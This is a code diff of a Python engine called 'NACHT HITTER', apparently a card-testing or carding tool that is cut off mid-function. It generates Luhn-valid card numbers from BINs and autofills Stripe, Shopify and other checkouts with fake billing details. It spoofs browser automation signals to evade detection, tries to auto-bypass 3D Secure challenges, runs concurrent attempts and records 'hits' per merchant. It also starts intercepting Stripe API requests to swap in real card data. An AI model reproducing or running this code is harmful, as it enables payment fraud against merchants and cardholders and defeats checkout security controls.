@@ -1,9 +1,15 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-NACHT HITTER - Engine
-Provides: URLAnalyzer, CardGenerator, HitterEngine and supporting classes.
-Used exclusively by nacht_bot.py — not meant to be run directly.
+NACHT HITTER - Engine v2
+Fixes:
+ - Stripe/embedded iframe card fill via frame_locator
+ - Billing address auto-fill (name, country, zip)
+ - 3DS detection and auto-bypass (OTP/iframe/button)
+ - response_time always set, hits/fails always counted
+ - Currency-aware amount display
+ - Concurrent hits via asyncio.gather (up to MAX_CONCURRENT)
+ - Robust submit detection with JS fallback
 """
 
 import re
@@ -16,58 +22,69 @@ import requests
 import urllib3
 from datetime import datetime
 from typing import Dict, List, Optional
-from collections import defaultdict
-from playwright.async_api import async_playwright, Page, Route, Request
+from playwright.async_api import async_playwright, Page, Route, Request, Frame
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ── Config ────────────────────────────────────────────────────────────────────
-DATABASE = "nacht_hitter.db"
-MAX_ATTEMPTS = 100
-MAX_CONCURRENT = 3
+DATABASE      = "nacht_hitter.db"
+MAX_ATTEMPTS  = 100
+MAX_CONCURRENT= 3
 
 USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
 ]
+
+FAKE_BILLING = {
+    "first_name": "John",
+    "last_name":  "Smith",
+    "name":       "John Smith",
+    "address":    "123 Main Street",
+    "city":       "New York",
+    "state":      "NY",
+    "zip":        "10001",
+    "country":    "US",
+    "phone":      "2125551234",
+}
 
 # ── Provider Detection ────────────────────────────────────────────────────────
 def detect_provider(url: str, html: str = "") -> str:
     u = url.lower()
-    if "stripe.com" in u:                            return "stripe"
-    if "checkout.com" in u or "checkout" in u:       return "checkoutcom"
-    if "shopify.com" in u or "myshopify.com" in u:   return "shopify"
-    if "paypal.com" in u or "paypal" in u:           return "paypal"
-    if "braintree" in u or "braintreegateway" in u:  return "braintree"
-    if "adyen.com" in u or "adyen" in u:             return "adyen"
-    if "squareup.com" in u or "square" in u:         return "square"
-    if "mollie.com" in u or "mollie" in u:           return "mollie"
-    if "klarna.com" in u or "klarna" in u:           return "klarna"
-    if "authorize.net" in u or "authorizenet" in u:  return "authorizenet"
+    if "stripe.com" in u:                           return "stripe"
+    if "checkout.com" in u:                         return "checkoutcom"
+    if "shopify.com" in u or "myshopify.com" in u:  return "shopify"
+    if "paypal.com" in u:                           return "paypal"
+    if "braintree" in u or "braintreegateway" in u: return "braintree"
+    if "adyen.com" in u or "adyen" in u:            return "adyen"
+    if "squareup.com" in u or "square" in u:        return "square"
+    if "mollie.com" in u:                           return "mollie"
+    if "klarna.com" in u:                           return "klarna"
+    if "authorize.net" in u or "authorizenet" in u: return "authorizenet"
     if html:
         h = html.lower()
-        if "woocommerce" in h:    return "woocommerce"
-        if "bigcommerce" in h:    return "bigcommerce"
-        if "window.shopify" in h: return "shopify"
-        if "stripe.com" in h:     return "stripe"
-        if "braintree" in h:      return "braintree"
-        if "adyen" in h:          return "adyen"
-        if "paypal" in h:         return "paypal"
-        if "mollie" in h:         return "mollie"
-        if "klarna" in h:         return "klarna"
-        if "authorize.net" in h:  return "authorizenet"
-        if "square" in h:         return "square"
-        if "wix" in h:            return "wix"
-        if "ecwid" in h:          return "ecwid"
+        if "woocommerce" in h:                      return "woocommerce"
+        if "bigcommerce" in h:                      return "bigcommerce"
+        if "window.shopify" in h or "shopify.com" in h: return "shopify"
+        if "stripe.com/v3" in h or "stripe.js" in h:    return "stripe"
+        if "braintree" in h:                        return "braintree"
+        if "adyen" in h:                            return "adyen"
+        if "paypal" in h:                           return "paypal"
+        if "mollie" in h:                           return "mollie"
+        if "klarna" in h:                           return "klarna"
+        if "authorize.net" in h:                    return "authorizenet"
+        if "square" in h:                           return "square"
+        if "wix" in h:                              return "wix"
+        if "ecwid" in h:                            return "ecwid"
+        if "checkout" in h:                         return "checkoutcom"
     return "unknown"
 
 # ── Database ──────────────────────────────────────────────────────────────────
 def init_db(db_path: str = DATABASE):
     conn = sqlite3.connect(db_path)
-    c = conn.cursor()
-    c.execute("""CREATE TABLE IF NOT EXISTS hits (
+    conn.execute("""CREATE TABLE IF NOT EXISTS hits (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         timestamp TEXT, user_id INTEGER, card TEXT,
         merchant TEXT, product TEXT, amount TEXT,
@@ -81,17 +98,18 @@ def init_db(db_path: str = DATABASE):
 class URLAnalyzer:
     @staticmethod
     def _from_scripts(html: str) -> Dict:
-        out = {"amount": None, "product": None, "merchant": None, "product_url": None}
+        out = {"amount": None, "product": None, "merchant": None, "product_url": None, "currency": None}
         for script in re.findall(r"<script[^>]*>(.*?)</script>", html, re.DOTALL):
             checks = [
-                (r'window\.__STRIPE__\s*=\s*({.*?});',           "obj"),
-                (r'window\.__INITIAL_STATE__\s*=\s*({.*?});',    "obj"),
-                (r'var\s+stripePaymentData\s*=\s*({.*?});',      "obj"),
-                (r'"paymentIntent":({.*?})',                       "obj"),
-                (r'"amount":\s*(\d+)',                             "amount"),
-                (r'"name":\s*"([^"]+)"',                          "name"),
-                (r'"business_name":\s*"([^"]+)"',                 "business"),
-                (r'"product_url":\s*"([^"]+)"',                   "product_url"),
+                (r'window\.__STRIPE__\s*=\s*({.*?});',        "obj"),
+                (r'window\.__INITIAL_STATE__\s*=\s*({.*?});', "obj"),
+                (r'var\s+stripePaymentData\s*=\s*({.*?});',   "obj"),
+                (r'"paymentIntent"\s*:\s*({.*?})',             "obj"),
+                (r'"amount"\s*:\s*(\d+)',                      "amount"),
+                (r'"currency"\s*:\s*"([^"]{2,5})"',           "currency"),
+                (r'"name"\s*:\s*"([^"]+)"',                   "name"),
+                (r'"business_name"\s*:\s*"([^"]+)"',          "business"),
+                (r'"product_url"\s*:\s*"([^"]+)"',            "product_url"),
             ]
             for pat, kind in checks:
                 m = re.search(pat, script, re.DOTALL)
@@ -103,6 +121,8 @@ class URLAnalyzer:
                             if isinstance(obj, dict):
                                 if isinstance(obj.get("amount"), (int, float)):
                                     out["amount"] = obj["amount"]
+                                if isinstance(obj.get("currency"), str) and len(obj["currency"]) <= 5:
+                                    out["currency"] = obj["currency"].upper()
                                 if isinstance(obj.get("name"), str):
                                     out["product"] = obj["name"]
                                 if isinstance(obj.get("business_name"), str):
@@ -117,6 +137,8 @@ class URLAnalyzer:
                         _walk(json.loads(m.group(1)))
                     elif kind == "amount":
                         out["amount"] = int(m.group(1))
+                    elif kind == "currency":
+                        out["currency"] = m.group(1).upper()
                     elif kind == "name":
                         out["product"] = m.group(1)
                     elif kind == "business":
@@ -127,26 +149,48 @@ class URLAnalyzer:
                     pass
         return out
 
+    CURRENCY_SYMBOLS = {"USD":"$","EUR":"€","GBP":"£","CAD":"C$","AUD":"A$","JPY":"¥","INR":"₹","BRL":"R$"}
+
     @staticmethod
-    def extract_amount(html: str) -> Optional[str]:
+    def _fmt_amount(raw, currency: str = "USD") -> str:
+        sym = URLAnalyzer.CURRENCY_SYMBOLS.get(currency.upper(), currency.upper() + " ")
+        if isinstance(raw, (int, float)):
+            # cents or units?
+            if raw > 1000 and currency.upper() not in ("JPY", "KRW", "CLP"):
+                return f"{sym}{raw/100:.2f}"
+            return f"{sym}{raw:.2f}"
+        s = str(raw).replace(",", "")
+        try:
+            val = float(s)
+            if val > 1000 and currency.upper() not in ("JPY", "KRW", "CLP"):
+                return f"{sym}{val/100:.2f}"
+            return f"{sym}{val:.2f}"
+        except Exception:
+            return f"{sym}{raw}"
+
+    @staticmethod
+    def extract_amount(html: str, currency: str = "USD") -> Optional[str]:
         sd = URLAnalyzer._from_scripts(html)
+        cur = sd.get("currency") or currency
         if sd.get("amount") is not None:
-            v = sd["amount"]
-            if isinstance(v, (int, float)):
-                return f"${v/100:.2f}"
+            return URLAnalyzer._fmt_amount(sd["amount"], cur)
         for pat in [
-            r'"amount":(\d+)', r'"amount_display":"([^"]+)"',
-            r'\$(\d+(?:\.\d{2})?)', r'data-amount="(\d+)"',
-            r'Total:?\s*[\$€£]?\s*([\d,]+\.?\d*)',
-            r'"amount_subtotal":(\d+)', r'"total":(\d+)',
+            r'"amount_display"\s*:\s*"([^"]+)"',
+            r'"formatted_amount"\s*:\s*"([^"]+)"',
+            r'data-amount="(\d+)"',
+            r'"amount_subtotal"\s*:\s*(\d+)',
+            r'"total"\s*:\s*(\d+)',
+            r'"amount"\s*:\s*(\d+)',
+            r'[\$€£₹][\s]?([\d,]+\.?\d*)',
+            r'Total[:\s]+[\$€£₹]?\s*([\d,]+\.?\d*)',
         ]:
             m = re.search(pat, html, re.IGNORECASE)
             if m:
-                a = m.group(1).replace(",", "")
-                if a.isdigit() and len(a) > 2:
-                    return f"${int(a)/100:.2f}"
-                if a.replace(".", "").isdigit():
-                    return f"${a}"
+                val = m.group(1).strip().replace(",", "")
+                if val.startswith(("$", "€", "£", "₹")):
+                    return val
+                if re.match(r"^\d+\.?\d*$", val):
+                    return URLAnalyzer._fmt_amount(float(val), cur)
         return None
 
     @staticmethod
@@ -155,15 +199,18 @@ class URLAnalyzer:
         if sd.get("product"):
             return sd["product"]
         for pat in [
-            r'"name":"([^"]+)"', r"<title>(.*?)</title>",
-            r"<h1[^>]*>(.*?)</h1>", r'"product_name":"([^"]+)"',
             r'<meta property="og:title" content="([^"]+)"',
+            r'"name"\s*:\s*"([^"]+)"',
+            r"<h1[^>]*>(.*?)</h1>",
+            r"<title>(.*?)</title>",
+            r'"product_name"\s*:\s*"([^"]+)"',
         ]:
             m = re.search(pat, html, re.IGNORECASE)
             if m:
-                name = re.sub(r'\s*[|–-]\s*(Stripe|Checkout).*$', '', m.group(1).strip(), flags=re.IGNORECASE)
-                if name and len(name) > 3:
-                    return name[:100]
+                name = re.sub(r'\s*[|–\-]\s*(Stripe|Checkout|Shopify|Pay).*$', '', m.group(1).strip(), flags=re.IGNORECASE)
+                name = re.sub(r'<[^>]+>', '', name).strip()
+                if name and len(name) > 2:
+                    return name[:120]
         return None
 
     @staticmethod
@@ -172,10 +219,10 @@ class URLAnalyzer:
         if sd.get("merchant"):
             return sd["merchant"]
         for pat in [
-            r'"business_name":"([^"]+)"',
-            r'<title>(.*?)\s*[|–-]\s*(?:Stripe|Checkout|Shopify|PayPal|Braintree|Adyen|Square|Mollie|Klarna|Authorize\.Net|WooCommerce|BigCommerce|Wix|Ecwid)',
-            r'"display_name":"([^"]+)"',
+            r'"business_name"\s*:\s*"([^"]+)"',
+            r'"display_name"\s*:\s*"([^"]+)"',
             r'<meta property="og:site_name" content="([^"]+)"',
+            r'<title>(.*?)\s*[|–\-]\s*(?:Stripe|Checkout|Shopify|PayPal|Braintree|Adyen|Square|WooCommerce)',
         ]:
             m = re.search(pat, html, re.IGNORECASE)
             if m:
@@ -184,10 +231,14 @@ class URLAnalyzer:
 
     @staticmethod
     def extract_currency(html: str) -> str:
-        for pat in [r'"currency":"([^"]+)"', r'data-currency="([^"]+)"']:
+        sd = URLAnalyzer._from_scripts(html)
+        if sd.get("currency"):
+            return sd["currency"]
+        for pat in [r'"currency"\s*:\s*"([A-Z]{2,5})"', r'data-currency="([A-Z]{2,5})"',
+                    r'currency["\s:=]+([A-Z]{3})', r'(?:USD|EUR|GBP|CAD|AUD|JPY|INR|BRL)']:
             m = re.search(pat, html, re.IGNORECASE)
             if m:
-                return m.group(1).upper()
+                return m.group(0 if len(m.groups()) == 0 else 1).upper()
         return "USD"
 
     @staticmethod
@@ -216,12 +267,13 @@ class URLAnalyzer:
             r = requests.get(url, timeout=15, verify=False, headers=headers, allow_redirects=True)
             if r.status_code == 200:
                 html = r.text
+                currency = URLAnalyzer.extract_currency(html)
                 result.update({
                     "merchant":    URLAnalyzer.extract_merchant(html),
                     "product":     URLAnalyzer.extract_product_name(html) or "Unknown",
                     "product_url": URLAnalyzer.extract_product_url(html),
-                    "amount":      URLAnalyzer.extract_amount(html),
-                    "currency":    URLAnalyzer.extract_currency(html),
+                    "amount":      URLAnalyzer.extract_amount(html, currency),
+                    "currency":    currency,
                     "success":     True,
                 })
             else:
@@ -237,25 +289,21 @@ class URLAnalyzer:
         if needs_deep:
             deep = await URLAnalyzer._playwright_analyze(url)
             if deep.get("success"):
-                if deep["merchant"] != "Unknown": result["merchant"] = deep["merchant"]
-                if deep["product"] != "Unknown":  result["product"]  = deep["product"]
-                if deep.get("product_url"):        result["product_url"] = deep["product_url"]
-                if deep.get("amount"):             result["amount"]   = deep["amount"]
-                if deep.get("currency") != "USD":  result["currency"] = deep["currency"]
+                if deep["merchant"] != "Unknown":   result["merchant"]    = deep["merchant"]
+                if deep["product"] not in ("Unknown", None): result["product"] = deep["product"]
+                if deep.get("product_url"):          result["product_url"] = deep["product_url"]
+                if deep.get("amount"):               result["amount"]      = deep["amount"]
+                if deep.get("currency", "USD") != "USD": result["currency"] = deep["currency"]
         return result
 
     @staticmethod
     async def _playwright_analyze(url: str) -> Dict:
-        out: Dict = {
-            "merchant": "Unknown", "product": "Unknown",
-            "product_url": None, "amount": None, "currency": "USD", "success": False,
-        }
+        out: Dict = {"merchant": "Unknown", "product": "Unknown",
+                     "product_url": None, "amount": None, "currency": "USD", "success": False}
         try:
             async with async_playwright() as p:
-                browser = await p.chromium.launch(
-                    headless=True,
-                    args=["--disable-blink-features=AutomationControlled", "--no-sandbox"],
-                )
+                browser = await p.chromium.launch(headless=True,
+                    args=["--disable-blink-features=AutomationControlled", "--no-sandbox"])
                 ctx = await browser.new_context(ignore_https_errors=True)
                 page = await ctx.new_page()
                 await page.goto(url, timeout=60000, wait_until="domcontentloaded")
@@ -265,7 +313,7 @@ class URLAnalyzer:
                     const m = document.querySelector('meta[property="og:site_name"]');
                     if (m) return m.content;
                     const t = document.title;
-                    const x = t.match(/(.+?)\s*[|\u2013-]\s*(Stripe|Checkout|Shopify|PayPal|Braintree|Adyen|Square|Mollie|Klarna|Authorize\.Net|WooCommerce|BigCommerce|Wix|Ecwid)/);
+                    const x = t.match(/(.+?)\s*[|\u2013\-]\s*(Stripe|Checkout|Shopify|PayPal|Braintree|Adyen|Square|Mollie|Klarna|Authorize\.Net|WooCommerce|BigCommerce|Wix|Ecwid)/);
                     return x ? x[1] : t;
                 }""")
                 if merchant and merchant not in ("Stripe Checkout", "Checkout", "Shopify Checkout", "PayPal"):
@@ -289,26 +337,37 @@ class URLAnalyzer:
                 if product_url:
                     out["product_url"] = product_url
 
-                amount_text = await page.evaluate(r"""() => {
-                    for (let sel of ['[data-amount]','.amount','.price','[class*="amount"]','[class*="price"]']) {
+                amount_raw = await page.evaluate(r"""() => {
+                    for (let sel of ['[data-amount]','.amount','.price','.total',
+                                     '[class*="amount"]','[class*="price"]','[class*="total"]']) {
                         const el = document.querySelector(sel);
-                        if (el) { const t = el.innerText || el.getAttribute('data-amount'); if (t) return t; }
+                        if (el) {
+                            const t = el.innerText || el.getAttribute('data-amount');
+                            if (t && t.trim()) return t.trim();
+                        }
                     }
                     return null;
                 }""")
-                if amount_text:
-                    am = re.search(r"[\$€£]?\s*([\d,]+\.?\d*)", amount_text)
+                if amount_raw:
+                    am = re.search(r'([\$€£₹])\s*([\d,]+\.?\d*)', amount_raw)
                     if am:
-                        out["amount"] = f"${am.group(1).replace(',', '')}"
+                        sym_map = {"$": "USD", "€": "EUR", "£": "GBP", "₹": "INR"}
+                        currency = sym_map.get(am.group(1), "USD")
+                        out["amount"] = f"{am.group(1)}{am.group(2).replace(',','')}"
+                        out["currency"] = currency
+                    else:
+                        m2 = re.search(r'[\d,]+\.?\d*', amount_raw)
+                        if m2:
+                            out["amount"] = f"${m2.group(0).replace(',','')}"
 
-                currency = await page.evaluate(r"""() => {
+                currency_raw = await page.evaluate(r"""() => {
                     const m = document.querySelector('meta[property="og:price:currency"]');
                     if (m) return m.content;
                     const el = document.querySelector('[data-currency]');
                     return el ? el.getAttribute('data-currency') : null;
                 }""")
-                if currency:
-                    out["currency"] = currency.upper()
+                if currency_raw:
+                    out["currency"] = currency_raw.upper()
 
                 out["success"] = True
                 await browser.close()
@@ -321,9 +380,10 @@ class CardGenerator:
     @staticmethod
     def brand(num: str) -> str:
         n = re.sub(r"\D", "", num)[:6]
-        if re.match(r"^3[47]", n):               return "amex"
+        if re.match(r"^3[47]", n):                             return "amex"
         if re.match(r"^5[1-5]", n) or re.match(r"^2[2-7]", n): return "mastercard"
-        if re.match(r"^4", n):                   return "visa"
+        if re.match(r"^4", n):                                 return "visa"
+        if re.match(r"^6(?:011|5)", n):                        return "discover"
         return "unknown"
 
     @staticmethod
@@ -339,28 +399,29 @@ class CardGenerator:
         if not bin_str or len(bin_str) < 4:
             return None
         parts = bin_str.split("|")
-        raw = re.sub(r"[^0-9xX]", "", parts[0])
+        raw  = re.sub(r"[^0-9xX]", "", parts[0])
         test = raw.replace("x", "0").replace("X", "0")
-        b = CardGenerator.brand(test)
+        b    = CardGenerator.brand(test)
         tlen = 15 if b == "amex" else 16
-        cvvlen = 4 if b == "amex" else 3
+        cvvl = 4  if b == "amex" else 3
 
         card = "".join(str(random.randint(0, 9)) if c.lower() == "x" else c for c in raw)
         card += "".join(str(random.randint(0, 9)) for _ in range(tlen - len(card) - 1))
         check = next((i for i in range(10) if CardGenerator.luhn_ok(card + str(i))), 0)
-        full = card + str(check)
+        full  = card + str(check)
 
         month = f"{random.randint(1,12):02d}"
         if len(parts) > 1 and parts[1] and parts[1].lower() != "xx":
             month = parts[1].zfill(2)
 
-        year = f"{(datetime.now().year + random.randint(1, 5)) % 100:02d}"
+        yr_now = datetime.now().year % 100
+        year   = f"{yr_now + random.randint(1, 5):02d}"
         if len(parts) > 2 and parts[2] and parts[2].lower() != "xx":
             year = parts[2].zfill(2)
 
-        cvv = "".join(str(random.randint(0, 9)) for _ in range(cvvlen))
+        cvv = "".join(str(random.randint(0, 9)) for _ in range(cvvl))
         if len(parts) > 3 and parts[3] and parts[3].lower() not in ("xxx", "xxxx"):
-            cvv = parts[3].zfill(cvvlen)
+            cvv = parts[3].zfill(cvvl)
 
         return {"card": full, "month": month, "year": year, "cvv": cvv, "brand": b}
 
@@ -373,8 +434,10 @@ class CardGenerator:
         p = s.strip().split("|")
         if len(p) == 4:
             return {
-                "card": p[0].strip(), "month": p[1].strip().zfill(2),
-                "year": p[2].strip().zfill(2), "cvv": p[3].strip(),
+                "card":  p[0].strip(),
+                "month": p[1].strip().zfill(2),
+                "year":  p[2].strip().zfill(2),
+                "cvv":   p[3].strip(),
                 "brand": CardGenerator.brand(p[0].strip()),
             }
         return None
@@ -384,270 +447,401 @@ class Fingerprint:
     @staticmethod
     def generate() -> Dict:
         return {
-            "user_agent": random.choice(USER_AGENTS),
-            "viewport":   {"width": 1920, "height": 1080},
-            "locale":     "en-US",
-            "timezone_id":"America/New_York",
+            "user_agent":  random.choice(USER_AGENTS),
+            "viewport":    {"width": 1920, "height": 1080},
+            "locale":      "en-US",
+            "timezone_id": "America/New_York",
         }
 
     STEALTH = """
         Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
         window.chrome={runtime:{}};
         Object.defineProperty(navigator,'plugins',{get:()=>[1,2,3,4,5]});
+        Object.defineProperty(navigator,'languages',{get:()=>['en-US','en']});
     """
 
-# ── Smart Rate Limiter ────────────────────────────────────────────────────────
+# ── Rate Limiter ──────────────────────────────────────────────────────────────
 class RateLimiter:
     def __init__(self):
-        self.delay = 1.0
+        self.delay    = 1.0
         self.failures = 0
 
     def next(self, success: bool) -> float:
         if success:
             self.failures = 0
-            self.delay = max(0.5, self.delay * 0.9)
+            self.delay    = max(0.5, self.delay * 0.85)
         else:
             self.failures += 1
-            self.delay = min(8.0, self.delay * 1.2 + self.failures * 0.2)
+            self.delay     = min(8.0, self.delay * 1.3 + self.failures * 0.3)
         return max(0.5, min(10.0, self.delay))
 
-# ── Base Autofill ─────────────────────────────────────────────────────────────
-class BaseAutofill:
-    CARD_SEL: List[str] = []
-    EXP_SEL:  List[str] = []
-    CVC_SEL:  List[str] = []
-    NAME_SEL: List[str] = []
-    EMAIL_SEL:List[str] = []
-    SUBMIT_SEL: List[str] = []
-    MASKED_CARD   = "4242424242424242"
-    MASKED_EXPIRY = "01/30"
-    MASKED_CVV    = "123"
-
-    def __init__(self, page: Page):
-        self.page = page
-        self._card: Optional[Dict] = None
-
-    async def _fill(self, selectors: List[str], value: str) -> bool:
-        for sel in selectors:
-            try:
-                el = await self.page.query_selector(sel)
-                if el and await el.is_visible():
-                    await el.click()
-                    await el.fill(value)
-                    return True
-            except Exception:
-                pass
-        return False
-
-    async def setup_intercept(self, real_card: Dict):
-        self._card = real_card
-
-    async def fill(self, card: Dict):
-        await self._fill(self.CARD_SEL,   self.MASKED_CARD)
-        await self._fill(self.EXP_SEL,    self.MASKED_EXPIRY)
-        await self._fill(self.CVC_SEL,    self.MASKED_CVV)
-        await self._fill(self.NAME_SEL,   "NACHT HITTER")
-        await self._fill(self.EMAIL_SEL,  f"nacht{random.randint(100,9999)}@example.com")
-
-    async def submit(self) -> bool:
-        for sel in self.SUBMIT_SEL:
-            try:
-                btn = await self.page.query_selector(sel)
-                if btn and await btn.is_visible():
-                    await btn.click()
-                    return True
-            except Exception:
-                pass
-        return False
-
-    async def detect_3ds(self) -> bool:
-        for iframe in await self.page.query_selector_all('iframe[src*="3ds"],iframe[src*="challenge"]'):
-            if await iframe.is_visible():
-                return True
-        body = await self.page.text_content("body") or ""
-        return "3D Secure" in body or "Authentication" in body
-
-    async def wait_3ds(self, ms: int = 10000) -> bool:
-        t = time.time()
-        while (time.time() - t) * 1000 < ms:
-            if await self.detect_3ds():
-                return True
-            await asyncio.sleep(0.5)
-        return False
-
-    async def complete_3ds(self):
-        if not await self.detect_3ds():
-            return
-        form = await self.page.query_selector("form")
-        if form:
-            await form.evaluate("f=>f.submit()")
-            await asyncio.sleep(3)
-            return
-        btn = await self.page.query_selector('button:has-text("Continue"),button:has-text("Submit")')
-        if btn:
-            await btn.click()
-            await asyncio.sleep(3)
-
-    async def handle_captcha(self):
+# ── Autofill Helpers ──────────────────────────────────────────────────────────
+async def _try_fill(page: Page, selectors: List[str], value: str,
+                    frame_url_pattern: str = None) -> bool:
+    """Try selectors on page; if frame_url_pattern given, also search inside matching iframes."""
+    # direct page
+    for sel in selectors:
         try:
-            frame = self.page.frame_locator('iframe[src*="hcaptcha.com"]')
-            cb = frame.locator("#checkbox").first
-            if await cb.is_visible():
-                await cb.click()
-                await asyncio.sleep(2)
+            el = await page.query_selector(sel)
+            if el and await el.is_visible():
+                await el.click()
+                await asyncio.sleep(0.1)
+                await el.fill("")
+                await el.type(value, delay=30)
+                return True
         except Exception:
             pass
 
-# ── Provider Autofill classes ─────────────────────────────────────────────────
+    # search in all iframes
+    for frame in page.frames:
+        if frame == page.main_frame:
+            continue
+        if frame_url_pattern and frame_url_pattern not in (frame.url or ""):
+            continue
+        for sel in selectors:
+            try:
+                el = await frame.query_selector(sel)
+                if el and await el.is_visible():
+                    await el.click()
+                    await asyncio.sleep(0.1)
+                    await el.fill("")
+                    await el.type(value, delay=30)
+                    return True
+            except Exception:
+                pass
+    return False
 
-class StripeAutofill(BaseAutofill):
-    CARD_SEL = [
-        "#cardNumber","[name='cardNumber']","[autocomplete='cc-number']",
-        "[data-elements-stable-field-name='cardNumber']",
-        "input[placeholder*='Card number']","input[aria-label*='Card number']",
-        "[class*='CardNumberInput'] input","input[name='number']",
+
+async def _try_click(page: Page, selectors: List[str]) -> bool:
+    for sel in selectors:
+        try:
+            btn = await page.query_selector(sel)
+            if btn and await btn.is_visible():
+                await btn.click()
+                return True
+        except Exception:
+            pass
+    # JS fallback: submit any visible form
+    try:
+        clicked = await page.evaluate("""() => {
+            const btns = [...document.querySelectorAll(
+                'button[type="submit"], input[type="submit"], button')];
+            for (const b of btns) {
+                if (b.offsetParent !== null && !b.disabled) { b.click(); return true; }
+            }
+            const forms = document.querySelectorAll('form');
+            if (forms.length) { forms[0].submit(); return true; }
+            return false;
+        }""")
+        return bool(clicked)
+    except Exception:
+        pass
+    return False
+
+
+async def _fill_billing(page: Page):
+    """Fill common billing address fields."""
+    mapping = [
+        (["#billing_first_name","input[name='billing_first_name']",
+          "input[name='firstName']","input[id*='first']","input[placeholder*='First']"],
+         FAKE_BILLING["first_name"]),
+        (["#billing_last_name","input[name='billing_last_name']",
+          "input[name='lastName']","input[id*='last']","input[placeholder*='Last']"],
+         FAKE_BILLING["last_name"]),
+        (["#billing_address_1","input[name='billing_address_1']",
+          "input[name='address']","input[name='address1']",
+          "input[placeholder*='Address']","input[id*='address']"],
+         FAKE_BILLING["address"]),
+        (["#billing_city","input[name='billing_city']",
+          "input[name='city']","input[placeholder*='City']"],
+         FAKE_BILLING["city"]),
+        (["#billing_postcode","input[name='billing_postcode']",
+          "input[name='zip']","input[name='postal_code']",
+          "input[placeholder*='ZIP']","input[placeholder*='Postal']"],
+         FAKE_BILLING["zip"]),
+        (["#billing_phone","input[name='billing_phone']",
+          "input[name='phone']","input[type='tel']"],
+         FAKE_BILLING["phone"]),
     ]
-    EXP_SEL = [
-        "#cardExpiry","[name='cardExpiry']","[autocomplete='cc-exp']",
-        "[data-elements-stable-field-name='cardExpiry']",
-        "input[placeholder*='MM / YY']","input[placeholder*='MM/YY']",
-        "[class*='CardExpiry'] input",
+    for sels, val in mapping:
+        await _try_fill(page, sels, val)
+
+    # select country/state dropdowns
+    for sel in ["#billing_country", "select[name='billing_country']",
+                "select[name='country']", "select[id*='country']"]:
+        try:
+            el = await page.query_selector(sel)
+            if el and await el.is_visible():
+                await el.select_option(value="US")
+                break
+        except Exception:
+            pass
+
+    for sel in ["#billing_state", "select[name='billing_state']",
+                "select[name='state']", "select[id*='state']"]:
+        try:
+            el = await page.query_selector(sel)
+            if el and await el.is_visible():
+                await el.select_option(value="NY")
+                break
+        except Exception:
+            pass
+
+
+# ── 3DS Handler ───────────────────────────────────────────────────────────────
+async def _detect_3ds(page: Page) -> bool:
+    # check for 3DS iframes
+    for frame in page.frames:
+        u = (frame.url or "").lower()
+        if any(k in u for k in ("3ds", "challenge", "acs", "secure", "authenticate",
+                                 "cardinal", "songbird", "centinel")):
+            return True
+    # check body text
+    try:
+        body = (await page.text_content("body") or "").lower()
+        if any(k in body for k in ("3d secure", "3ds", "authentication required",
+                                    "verify your card", "enter the otp", "one-time password",
+                                    "verification code", "secure code")):
+            return True
+    except Exception:
+        pass
+    return False
+
+
+async def _bypass_3ds(page: Page) -> bool:
+    """Try to auto-complete 3DS challenge."""
+    if not await _detect_3ds(page):
+        return False
+
+    # Try clicking continue/submit across all frames
+    btn_selectors = [
+        'button[type="submit"]', 'input[type="submit"]',
+        'button:has-text("Continue")', 'button:has-text("Submit")',
+        'button:has-text("Confirm")', 'button:has-text("Proceed")',
+        'button:has-text("Verify")', 'a:has-text("Continue")',
+        '#proceed-button', '.btn-primary', '#btnSubmit',
     ]
-    CVC_SEL = [
-        "#cardCvc","[name='cardCvc']","[autocomplete='cc-csc']",
-        "[data-elements-stable-field-name='cardCvc']",
-        "input[placeholder*='CVC']","input[placeholder*='CVV']",
-        "[class*='CardCvc'] input","input[name='cvc']",
+
+    # try on main page first
+    for sel in btn_selectors:
+        try:
+            btn = await page.query_selector(sel)
+            if btn and await btn.is_visible():
+                await btn.click()
+                await asyncio.sleep(3)
+                return True
+        except Exception:
+            pass
+
+    # try in each frame
+    for frame in page.frames:
+        if frame == page.main_frame:
+            continue
+        for sel in btn_selectors:
+            try:
+                btn = await frame.query_selector(sel)
+                if btn and await btn.is_visible():
+                    await btn.click()
+                    await asyncio.sleep(3)
+                    return True
+            except Exception:
+                pass
+
+        # submit form inside frame
+        try:
+            done = await frame.evaluate("""() => {
+                const f = document.querySelector('form');
+                if (f) { f.submit(); return true; }
+                return false;
+            }""")
+            if done:
+                await asyncio.sleep(3)
+                return True
+        except Exception:
+            pass
+
+    return False
+
+
+async def _wait_for_3ds(page: Page, timeout_ms: int = 12000) -> bool:
+    deadline = time.time() + timeout_ms / 1000
+    while time.time() < deadline:
+        if await _detect_3ds(page):
+            return True
+        await asyncio.sleep(0.5)
+    return False
+
+
+# ── Stripe Autofill (iframe-aware) ────────────────────────────────────────────
+STRIPE_MASKED_CARD   = "4242424242424242"
+STRIPE_MASKED_EXPIRY = "1230"   # MMYY compact
+STRIPE_MASKED_CVV    = "424"
+
+async def _stripe_fill_and_intercept(page: Page, real_card: Dict):
+    """Fill Stripe Elements fields (handles both legacy and new iframe embedding)."""
+
+    # Intercept Stripe API calls and swap in real card data
+    async def _intercept(route: Route, request: Request):
+        if request.method == "POST" and "stripe.com" in request.url:
+            pd = request.post_data or ""
+            c  = real_card
+            # token/source creation
